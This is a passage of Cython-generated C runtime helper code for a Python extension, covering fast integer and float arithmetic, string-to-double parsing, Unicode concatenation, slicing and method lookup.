long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {\n                    lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            case -4:\n                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                    a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {\n                    lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            case 4:\n                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {\n                    a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                #ifdef HAVE_LONG_LONG\n                } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {\n                    lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));\n                    goto long_long;\n                #endif\n                }\n                CYTHON_FALLTHROUGH;\n            default: return PyLong_Type.tp_as_number->nb_add(op1, op2);\n        }\n    }\n            x = a + b;\n        return PyLong_FromLong(x);\n#ifdef HAVE_LONG_LONG\n    long_long:\n            llx = lla + llb;\n        return PyLong_FromLongLong(llx);\n#endif\n    return __Pyx_Fallback___Pyx_PyLong_AddObjC(op1, op2, inplace);\n    \n    \n}\n#endif\nstatic PyObject* __Pyx_Float___Pyx_PyLong_AddObjC(PyObject *float_val, long intval, int zerodivision_check) {\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    const long b = intval;\n    double a = __Pyx_PyFloat_AS_DOUBLE(float_val);\n        double result;\n        \n        result = ((double)a) + (double)b;\n        return PyFloat_FromDouble(result);\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_AddObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {\n    CYTHON_MAYBE_UNUSED_VAR(intval);\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(PyLong_CheckExact(op1))) {\n        return __Pyx_Unpacked___Pyx_PyLong_AddObjC(op1, op2, intval, inplace, zerodivision_check);\n    }\n    #endif\n    if (PyFloat_CheckExact(op1)) {\n        return __Pyx_Float___Pyx_PyLong_AddObjC(op1, intval, zerodivision_check);\n    }\n    return __Pyx_Fallback___Pyx_PyLong_AddObjC(op1, op2, inplace);\n}\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {\n    PyObject *args[2] = {NULL, arg};\n    return __Pyx_PyObject_FastCall(func, args+1, 1 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n}\n\n\nstatic CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {\n    PyErr_Format(PyExc_ValueError,\n                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);\n}\n\n\nstatic CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {\n    PyErr_Format(PyExc_ValueError,\n                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",\n                 index, (index == 1) ? "" : "s");\n}\n\n\nstatic CYTHON_INLINE int __Pyx_IterFinish(void) {\n    PyObject* exc_type;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    exc_type = __Pyx_PyErr_CurrentExceptionType();\n    if (unlikely(exc_type)) {\n        if (unlikely(!__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration)))\n            return -1;\n        __Pyx_PyErr_Clear();\n        return 0;\n    }\n    return 0;\n}\n\n\nstatic int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {\n    if (unlikely(retval)) {\n        Py_DECREF(retval);\n        __Pyx_RaiseTooManyValuesError(expected);\n        return -1;\n    }\n    return __Pyx_IterFinish();\n}\n\n\nstatic double __Pyx_SlowPyString_AsDouble(PyObject *obj) {\n    PyObject *float_value = PyFloat_FromString(obj);\n    if (likely(float_value)) {\n        double value = __Pyx_PyFloat_AS_DOUBLE(float_value);\n        Py_DECREF(float_value);\n        return value;\n    }\n    return (double)-1;\n}\nstatic const char* __Pyx__PyBytes_AsDouble_Copy(const char* start, char* buffer, Py_ssize_t length) {\n    int last_was_punctuation = 1;\n    int parse_error_found = 0;\n    Py_ssize_t i;\n    for (i=0; i < length; i++) {\n        char chr = start[i];\n        int is_punctuation = (chr == \'_\') | (chr == \'.\') | (chr == \'e\') | (chr == \'E\');\n        *buffer = chr;\n        buffer += (chr != \'_\');\n        parse_error_found |= last_was_punctuation & is_punctuation;\n        last_was_punctuation = is_punctuation;\n    }\n    parse_error_found |= last_was_punctuation;\n    *buffer = \'\\0\';\n    return unlikely(parse_error_found) ? NULL : buffer;\n}\nstatic double __Pyx__PyBytes_AsDouble_inf_nan(const char* start, Py_ssize_t length) {\n    int matches = 1;\n    char sign = start[0];\n    int is_signed = (sign == \'+\') | (sign == \'-\');\n    start += is_signed;\n    length -= is_signed;\n    switch (start[0]) {\n        #ifdef Py_NAN\n        case \'n\':\n        case \'N\':\n            if (unlikely(length != 3)) goto parse_failure;\n            matches &= (start[1] == \'a\' || start[1] == \'A\');\n            matches &= (start[2] == \'n\' || start[2] == \'N\');\n            if (unlikely(!matches)) goto parse_failure;\n            return (sign == \'-\') ? -Py_NAN : Py_NAN;\n        #endif\n        case \'i\':\n        case \'I\':\n            if (unlikely(length < 3)) goto parse_failure;\n            matches &= (start[1] == \'n\' || start[1] == \'N\');\n            matches &= (start[2] == \'f\' || start[2] == \'F\');\n            if (likely(length == 3 && matches))\n                return (sign == \'-\') ? -Py_HUGE_VAL : Py_HUGE_VAL;\n            if (unlikely(length != 8)) goto parse_failure;\n            matches &= (start[3] == \'i\' || start[3] == \'I\');\n            matches &= (start[4] == \'n\' || start[4] == \'N\');\n            matches &= (start[5] == \'i\' || start[5] == \'I\');\n            matches &= (start[6] == \'t\' || start[6] == \'T\');\n            matches &= (start[7] == \'y\' || start[7] == \'Y\');\n            if (unlikely(!matches)) goto parse_failure;\n            return (sign == \'-\') ? -Py_HUGE_VAL : Py_HUGE_VAL;\n        case \'.\': case \'0\': case \'1\': case \'2\': case \'3\': case \'4\': case \'5\': case \'6\': case \'7\': case \'8\': case \'9\':\n            break;\n        default:\n            goto parse_failure;\n    }\n    return 0.0;\nparse_failure:\n    return -1.0;\n}\nstatic CYTHON_INLINE int __Pyx__PyBytes_AsDouble_IsSpace(char ch) {\n    return (ch == 0x20) | !((ch < 0x9) | (ch > 0xd));\n}\nCYTHON_UNUSED static double __Pyx__PyBytes_AsDouble(PyObject *obj, const char* start, Py_ssize_t length) {\n    double value;\n    Py_ssize_t i, digits;\n    const char *last = start + length;\n    char *end;\n    while (__Pyx__PyBytes_AsDouble_IsSpace(*start))\n        start++;\n    while (start < last - 1 && __Pyx__PyBytes_AsDouble_IsSpace(last[-1]))\n        last--;\n    length = last - start;\n    if (unlikely(length <= 0)) goto fallback;\n    value = __Pyx__PyBytes_AsDouble_inf_nan(start, length);\n    if (unlikely(value == -1.0)) goto fallback;\n    if (value != 0.0) return value;\n    digits = 0;\n    for (i=0; i < length; digits += start[i++] != \'_\');\n    if (likely(digits == length)) {\n        value = PyOS_string_to_double(start, &end, NULL);\n    } else if (digits < 40) {\n        char number[40];\n        last = __Pyx__PyBytes_AsDouble_Copy(start, number, length);\n        if (unlikely(!last)) goto fallback;\n        value = PyOS_string_to_double(number, &end, NULL);\n    } else {\n        char *number = (char*) PyMem_Malloc((digits + 1) * sizeof(char));\n        if (unlikely(!number)) goto fallback;\n        last = __Pyx__PyBytes_AsDouble_Copy(start, number, length);\n        if (unlikely(!last)) {\n            PyMem_Free(number);\n            goto fallback;\n        }\n        value = PyOS_string_to_double(number, &end, NULL);\n        PyMem_Free(number);\n    }\n    if (likely(end == last) || (value == (double)-1 && PyErr_Occurred())) {\n        return value;\n    }\nfallback:\n    return __Pyx_SlowPyString_AsDouble(obj);\n}\n\n\nstatic CYTHON_INLINE PyObject* __Pyx__PyNumber_Float(PyObject* obj) {\n    double val;\n    if (PyLong_CheckExact(obj)) {\n#if CYTHON_USE_PYLONG_INTERNALS\n        if (likely(__Pyx_PyLong_IsCompact(obj))) {\n            val = (double) __Pyx_PyLong_CompactValue(obj);\n            goto no_error;\n        }\n#endif\n        val = PyLong_AsDouble(obj);\n    } else if (PyUnicode_CheckExact(obj)) {\n        val = __Pyx_PyUnicode_AsDouble(obj);\n    } else if (PyBytes_CheckExact(obj)) {\n        val = __Pyx_PyBytes_AsDouble(obj);\n    } else if (PyByteArray_CheckExact(obj)) {\n        val = __Pyx_PyByteArray_AsDouble(obj);\n    } else {\n        return PyNumber_Float(obj);\n    }\n    if (unlikely(val == -1 && PyErr_Occurred())) {\n        return NULL;\n    }\n#if CYTHON_USE_PYLONG_INTERNALS\nno_error:\n#endif\n    return PyFloat_FromDouble(val);\n}\n\n\n#if !CYTHON_COMPILING_IN_PYPY\nstatic PyObject* __Pyx_Fallback___Pyx_PyLong_TrueDivideObjC(PyObject *op1, PyObject *op2, int inplace) {\n    return (inplace ? PyNumber_InPlaceTrueDivide : PyNumber_TrueDivide)(op1, op2);\n}\n#if CYTHON_USE_PYLONG_INTERNALS\nstatic PyObject* __Pyx_Unpacked___Pyx_PyLong_TrueDivideObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {\n    CYTHON_MAYBE_UNUSED_VAR(inplace);\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    const long b = intval;\n    long a, x;\n    if (unlikely(__Pyx_PyLong_IsZero(op1))) {\n    }\n    if (unlikely(!__Pyx_PyLong_CompactAsLong(op1, &a))) {\n        const digit* digits = __Pyx_PyLong_Digits(op1);\n        const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(op1);\n        switch (size) {\n            case -2:\n                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT && 1 * PyLong_SHIFT < 53) {\n                    a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            case 2:\n                if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT && 1 * PyLong_SHIFT < 53) {\n                    a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            case -3:\n                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT && 2 * PyLong_SHIFT < 53) {\n                    a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            case 3:\n                if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT && 2 * PyLong_SHIFT < 53) {\n                    a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            case -4:\n                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT && 3 * PyLong_SHIFT < 53) {\n                    a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            case 4:\n                if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT && 3 * PyLong_SHIFT < 53) {\n                    a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));\n                    break;\n                }\n                CYTHON_FALLTHROUGH;\n            default: return PyLong_Type.tp_as_number->nb_true_divide(op1, op2);\n        }\n    }\n            if ((8 * sizeof(long) <= 53 || likely(labs(a) <= ((PY_LONG_LONG)1 << 53)))\n                    || __Pyx_PyLong_DigitCount(op1) <= 52 / PyLong_SHIFT) {\n                return PyFloat_FromDouble((double)a / (double)b);\n            }\n            return PyLong_Type.tp_as_number->nb_true_divide(op1, op2);\n        return PyLong_FromLong(x);\n    \n}\n#endif\nstatic PyObject* __Pyx_Float___Pyx_PyLong_TrueDivideObjC(PyObject *float_val, long intval, int zerodivision_check) {\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    const long b = intval;\n    double a = __Pyx_PyFloat_AS_DOUBLE(float_val);\n        double result;\n        \n        result = ((double)a) / (double)b;\n        return PyFloat_FromDouble(result);\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyLong_TrueDivideObjC(PyObject *op1, PyObject *op2, long intval, int inplace, int zerodivision_check) {\n    CYTHON_MAYBE_UNUSED_VAR(intval);\n    CYTHON_UNUSED_VAR(zerodivision_check);\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(PyLong_CheckExact(op1))) {\n        return __Pyx_Unpacked___Pyx_PyLong_TrueDivideObjC(op1, op2, intval, inplace, zerodivision_check);\n    }\n    #endif\n    if (PyFloat_CheckExact(op1)) {\n        return __Pyx_Float___Pyx_PyLong_TrueDivideObjC(op1, intval, zerodivision_check);\n    }\n    return __Pyx_Fallback___Pyx_PyLong_TrueDivideObjC(op1, op2, inplace);\n}\n#endif\n\n\n#if CYTHON_USE_UNICODE_WRITER\nstatic PyObject* __Pyx_PyObject_Format(PyObject* obj, PyObject* format_spec) {\n    int ret;\n    _PyUnicodeWriter writer;\n    if (likely(PyFloat_CheckExact(obj))) {\n        _PyUnicodeWriter_Init(&writer);\n        ret = _PyFloat_FormatAdvancedWriter(\n            &writer,\n            obj,\n            format_spec, 0, PyUnicode_GET_LENGTH(format_spec));\n    } else if (likely(PyLong_CheckExact(obj))) {\n        _PyUnicodeWriter_Init(&writer);\n        ret = _PyLong_FormatAdvancedWriter(\n            &writer,\n            obj,\n            format_spec, 0, PyUnicode_GET_LENGTH(format_spec));\n    } else {\n        return PyObject_Format(obj, format_spec);\n    }\n    if (unlikely(ret == -1)) {\n        _PyUnicodeWriter_Dealloc(&writer);\n        return NULL;\n    }\n    return _PyUnicodeWriter_Finish(&writer);\n}\n#endif\n\n\n# if CYTHON_COMPILING_IN_CPYTHON\nstatic int\n__Pyx_unicode_modifiable(PyObject *unicode)\n{\n    if (Py_REFCNT(unicode) != 1)\n        return 0;\n    if (!PyUnicode_CheckExact(unicode))\n        return 0;\n    if (PyUnicode_CHECK_INTERNED(unicode))\n        return 0;\n    return 1;\n}\nstatic CYTHON_INLINE PyObject *__Pyx_PyUnicode_ConcatInPlaceImpl(PyObject **p_left, PyObject *right\n        #if CYTHON_REFNANNY\n        , void* __pyx_refnanny\n        #endif\n    ) {\n    PyObject *left = *p_left;\n    Py_ssize_t left_len, right_len, new_len;\n    if (unlikely(__Pyx_PyUnicode_READY(left) == -1))\n        return NULL;\n    if (unlikely(__Pyx_PyUnicode_READY(right) == -1))\n        return NULL;\n    left_len = PyUnicode_GET_LENGTH(left);\n    if (left_len == 0) {\n        Py_INCREF(right);\n        return right;\n    }\n    right_len = PyUnicode_GET_LENGTH(right);\n    if (right_len == 0) {\n        Py_INCREF(left);\n        return left;\n    }\n    if (unlikely(left_len > PY_SSIZE_T_MAX - right_len)) {\n        PyErr_SetString(PyExc_OverflowError,\n                        "strings are too large to concat");\n        return NULL;\n    }\n    new_len = left_len + right_len;\n    if (__Pyx_unicode_modifiable(left)\n            && PyUnicode_CheckExact(right)\n            && PyUnicode_KIND(right) <= PyUnicode_KIND(left)\n            && !(PyUnicode_IS_ASCII(left) && !PyUnicode_IS_ASCII(right))) {\n        int ret;\n        __Pyx_GIVEREF(*p_left);\n        ret = PyUnicode_Resize(p_left, new_len);\n        __Pyx_GOTREF(*p_left);\n        if (unlikely(ret != 0))\n            return NULL;\n        #if PY_VERSION_HEX >= 0x030d0000\n        if (unlikely(PyUnicode_CopyCharacters(*p_left, left_len, right, 0, right_len) < 0)) return NULL;\n        #else\n        _PyUnicode_FastCopyCharacters(*p_left, left_len, right, 0, right_len);\n        #endif\n        __Pyx_INCREF(*p_left);\n        __Pyx_GIVEREF(*p_left);\n        return *p_left;\n    } else {\n        return __Pyx_PyUnicode_Concat(left, right);\n    }\n  }\n#endif\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,\n        Py_ssize_t cstart, Py_ssize_t cstop,\n        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,\n        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {\n    __Pyx_TypeName obj_type_name;\n#if CYTHON_USE_TYPE_SLOTS\n    PyMappingMethods* mp = Py_TYPE(obj)->tp_as_mapping;\n    if (likely(mp && mp->mp_subscript))\n#endif\n    {\n        PyObject* result;\n        PyObject *py_slice, *py_start, *py_stop;\n        if (_py_slice) {\n            py_slice = *_py_slice;\n        } else {\n            PyObject* owned_start = NULL;\n            PyObject* owned_stop = NULL;\n            if (_py_start) {\n                py_start = *_py_start;\n            } else {\n                if (has_cstart) {\n                    owned_start = py_start = PyLong_FromSsize_t(cstart);\n                    if (unlikely(!py_start)) goto bad;\n                } else\n                    py_start = Py_None;\n            }\n            if (_py_stop) {\n                py_stop = *_py_stop;\n            } else {\n                if (has_cstop) {\n                    owned_stop = py_stop = PyLong_FromSsize_t(cstop);\n                    if (unlikely(!py_stop)) {\n                        Py_XDECREF(owned_start);\n                        goto bad;\n                    }\n                } else\n                    py_stop = Py_None;\n            }\n            py_slice = PySlice_New(py_start, py_stop, Py_None);\n            Py_XDECREF(owned_start);\n            Py_XDECREF(owned_stop);\n            if (unlikely(!py_slice)) goto bad;\n        }\n#if CYTHON_USE_TYPE_SLOTS\n        result = mp->mp_subscript(obj, py_slice);\n#else\n        result = PyObject_GetItem(obj, py_slice);\n#endif\n        if (!_py_slice) {\n            Py_DECREF(py_slice);\n        }\n        return result;\n    }\n    obj_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(obj));\n    PyErr_Format(PyExc_TypeError,\n        "\'" __Pyx_FMT_TYPENAME "\' object is unsliceable", obj_type_name);\n    __Pyx_DECREF_TypeName(obj_type_name);\nbad:\n    return NULL;\n}\n\n\nstatic CYTHON_INLINE PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {\n    PyObject *args[3] = {NULL, arg1, arg2};\n    return __Pyx_PyObject_FastCall(function, args+1, 2 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n}\n\n\nstatic int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {\n    PyObject *attr;\n#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP\n    __Pyx_TypeName type_name;\n    PyTypeObject *tp = Py_TYPE(obj);\n    PyObject *descr;\n    descrgetfunc f = NULL;\n    PyObject **dictptr, *dict;\n    int meth_found = 0;\n    assert (*method == NULL);\n    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {\n        attr = __Pyx_PyObject_GetAttrStr(obj, name);\n        goto try_unpack;\n    }\n    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {\n        return 0;\n    }\n    descr = _PyType_Lookup(tp, name);\n    if (likely(descr != NULL)) {\n        Py_INCREF(descr);\n#if defined(Py_TPFLAGS_METHOD_DESCRIPTOR) && Py_TPFLAGS_METHOD_DESCRIPTOR\n        if (__Pyx_PyType_HasFeature(Py_TYPE(descr), Py_TPFLAGS_METHOD_DESCRIPTOR))\n#else\n        #ifdef __Pyx_CyFunction_USED\n        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))\n        #else\n        if (likely(PyFunction_Check(descr) || __Pyx_IS_TYPE(descr, &PyMethodDescr_Type)))\n        #endif\n#endif\n        {\n            meth_found = 1;\n        } else {\n            f = Py_TYPE(descr)->tp_descr_get;\n            if (f != NULL && PyDescr_IsData(descr)) {\n                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));\n                Py_DECREF(descr);\n                goto try_unpack;\n            }\n        }\n    }\n    dictptr = _PyObject_GetDictPtr(obj);\n    if (dictptr != NULL && (dict = *dictptr) != NULL) {\n        Py_INCREF(dict);\n        attr = __Pyx_PyDict_GetItemStr(dict, name);\n        if (attr != NULL) {\n            Py_INCREF(attr);\n            Py_DECREF(dict);\n            Py_XDECREF(descr);\n            goto try_unpack;\n        }\n        Py_DECREF(dict);\n    }\n    if (meth_found) {\n        *method = descr;\n        return 1;\n    }\n    if (f != NULL) {\n        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));\n        Py_DECREF(descr);\n        goto try_unpack;\n    }\n    if (likely(descr != NULL)) {\n        *method = descr;\n        return 0;\n    }\n    type_name = __Pyx_PyType_GetFullyQualifiedName(tp);\n    PyErr_Format(PyExc_AttributeError,\n                 "\'" __Pyx_FMT_TYPENAME "\' object has no attribute \'%U\'",\n                 type_name, name);\n    __Pyx_DECREF_TypeName(type_name);\n    return 0;\n#else\n    attr = __Pyx_PyObject_GetAttrStr(obj, name);\n    goto try_unpack;\n#endif\ntry_unpack:\n#if CYTHON_UNPACK_METHODS\n    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {\n        PyObject *function = PyMethod_GET_FUNCTION(attr);\n        Py_INCREF(function);\n        Py_DECREF(attr);\n        *method = function;\n        return 1;\n    }\n#endif\n    *method = attr;\n    return 0;\n}\n\n\n#if !(CYTHON_VECTORCALL && (__PYX_LIMITED_VERSION_HEX >= 0x030C0000 || (!CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x03090000)))\nstatic PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {\n    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);\n    Py_DECREF(method);\n    return result;\n}\n#endif\nstatic PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {\n#if CYTHON_VECTORCALL && (__PYX_LIMITED_VERSION_HEX >= 0x030C0000 || (!CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX >= 0x03090000))\n    PyObject *args[2] = {obj, arg};\n    (void) __Pyx_PyObject_GetMethod;\n    (void) __Pyx_PyObject_CallOneArg;\n    (void) __Pyx_PyObject_Call2Args;\n    return PyObject_VectorcallMethod(method_name, args, 2 | PY_VECTORCALL_ARGUMENTS_OFFSET, NULL);\n#else\n    PyObject *method = NULL, *result;\n    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);\n    if (likely(is_method)) {\n        result = __Pyx_PyObject_Call2Args(method, obj, arg);\n        Py_DECREF(method);\n        return result;\n    }\n    if (unlikely(!method)) return NULL;\n    return __Pyx__PyObject_CallMethod1(method, arg);\n#endif\n}\n\n\nstatic CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {\n    if (likely(PyList_CheckExact(L))) {\n        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;\n    } else {\n        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_mstate_global->__pyx_n_u_append, x);\n        if (unlikely(!retval))\n            return -1;\n        Py_DECREF(retval);\n    }\n    return 0;\n}\n\n\n#if CYTHON_USE_TYPE_SLOTS\nstatic PyObject *__Pyx_PyObject_GetIndex(PyObject *obj, PyObject *index) {\n    PyObject *runerr = NULL;\n    Py_ssize_t key_value;\n    key_value = __Pyx_PyIndex_AsSsize_t(index);\n    if (likely(key_value != -1 || !(runerr = PyErr_Occurred()))) {\n        return __Pyx_GetItemInt_Fast(obj, key_value, 0, 1, 1);\n    }\n    if (PyErr_GivenExceptionMatches(runerr, PyExc_OverflowError)) {\n        __Pyx_TypeName index_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(index));\n        PyErr_Clear();\n        PyErr_Format(PyExc_IndexError,\n            "cannot fit \'" __Pyx_FMT_TYPENAME "\' into an index-sized integer", index_type_name);\n        __Pyx_DECREF_TypeName(index_type_name);\n    }\n    return NULL;\n}\nstatic PyObject *__Pyx_PyObject_GetItem_Slow(PyObject *obj, PyObject *key) {\n    __Pyx_TypeName obj_type_name;\n    if (likely(PyType_Check(obj))) {\n        PyObject *meth = __Pyx_PyObject_GetAttrStrNoError(obj, __pyx_mstate_global->__pyx_n_u_class_getitem);\n        if (!meth) {\n            PyErr_Clear();\n        } else {\n            PyObject *result = __Pyx_PyObject_CallOneArg(meth, key);\n            Py_DECREF(meth);\n            return result;\n        }\n    }\n    obj_type_name = __Pyx_PyType_GetFullyQualifiedName(Py_TYPE(obj));\n    PyErr_Format(PyExc_TypeError,\n        "\'" __Pyx_FMT_TYPENAME "\' object is not subscriptable", obj_type_name);\n    __Pyx_DECREF_TypeName(obj_type_name);\n    return NULL;\n}\nstatic PyObject *__Pyx_PyObject_GetItem(PyObject *obj, PyObject *key) {\n    PyTypeObject *tp = Py_TYPE(obj);\n    PyMappingMethods *mm = tp->tp_as_mapping;\n    PySequenceMethods *sm = tp->tp_as_sequence;\n    if (likely(mm && mm->mp_subscript)) {\n        return mm->mp_subscript(obj, key);\n    }\n    if (likely(sm && sm->sq_item)) {\n        return __Pyx_PyObject_GetIndex(obj, key);\n    }\n    return __Pyx_PyObject_GetItem_Slow(obj, key);\n}\n#endif\n\n\n#if !CYTHON_USE_TYPE_SPECS || (!CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x03090000)\n#else\nstatic int __Pyx_call_type_traverse(PyObject *o, int always_call, visitproc visit, void *arg) {\n    #if CYTHON_COMPILING_IN_LIMITED_API && __PYX_LIMITED_VERSION_HEX < 0x03090000\n    if (__Pyx_get_runtime_version() < 0x03090000) return 0;\n    #endif\n    if (!always_call) {\n        PyTypeObject *base = __Pyx_PyObject_GetSlot(o, tp_base, PyTypeObject*);\n        unsigned long flags = PyType_GetFlags(base);\n        if (flags & Py_TPFLAGS_HEAPTYPE) {\n            return 0;\n        }\n    }\n    Py_VISIT((PyObject*)Py_TYPE(o));\n    return 0;\n}\n#endif\n\n\n#if CYTHON_COMPILING_IN_LIMITED_API\nstatic Py_ssize_t __Pyx_GetTypeDictOffset(void) {\n    PyObject *tp_dictoffset_o;\n    Py_ssize_t tp_dictoffset;\n    tp_dictoffset_o = PyObject_GetAttrString((PyObject*)(&PyType_Type), "__dictoffset__");\n    if (unlikely(!tp_dictoffset_o)) return -1;\n    tp_dictoffset = PyLong_AsSsize_t(tp_dictoffset_o);\n    Py_DECREF(tp_dictoffset_o);\n    if (unlikely(tp_dictoffset == 0)) {\n        PyErr_SetString(\n            PyExc_TypeError,\n            "\'type\' doesn\'t have a dictoffset");\n        return -1;\n    } else if (unlikely(tp_dictoffset < 0)) {\n        PyErr_SetString(\n            PyExc_TypeError,\n            "\'type\' has an unexpected negative dictoffset. "\n            "Please report this as Cython bug");\n        return -1;\n    }\n    return tp_dictoffset;\n}\nstatic PyObject *__Pyx_GetTypeDict(PyTypeObject *tp) {\n    static Py_ssize_t tp_dictoffset = 0;\n    if (unlikely(tp_dictoffset == 0)) {\n        tp_dictoffset = __Pyx_GetTypeDictOffset();\n        if (unlikely(tp_dictoffset == -1 && PyErr_Occurred())) {\n            tp_dictoffset = 0; // try again next time?\n            return NULL;\n        }\n    }\n    return *(PyObject**)((char*)tp + tp_dictoffset);\n}\n#endif\n\n\nstatic int __Pyx__SetItemOnTypeDict(PyTypeObject *tp, PyObject *k, PyObject *v) {\n    int result;\n    PyObject *tp_dict;\n#if CYTHON_COMPILING_IN_LIMITED_API\n    tp_dict = __Pyx_GetTypeDict(tp);\n    if (unlikely(!tp_dict)) return -1;\n#else\n    tp_dict = tp->tp_dict;\n#endif\n    result = PyDict_SetItem(tp_dict, k, v);\n    if (likely(!result)) {\n        PyType_Modified(tp);\n        if (unlikely(PyObject_HasAttr(v, __pyx_mstate_global->__pyx_n_u_set_name))) {\n            PyObject *setNameResult = PyObject_CallMethodObjArgs(v, __pyx_mstate_global->__pyx_n_u_set_name,  (PyObject *) tp, k, NULL);\n            if (!setNameResult) return -1;\n            Py_DECREF(setNameResult);\n        }\n    }\n    return result;\n}\n\n\nstatic int __Pyx_fix_up_extension_type_from_spec(PyType_Spec *spec, PyTypeObject *type) {\n#if __PYX_LIMITED_VERSION_HEX > 0x030900B1\n    CYTHON_UNUSED_VAR(spec);\n    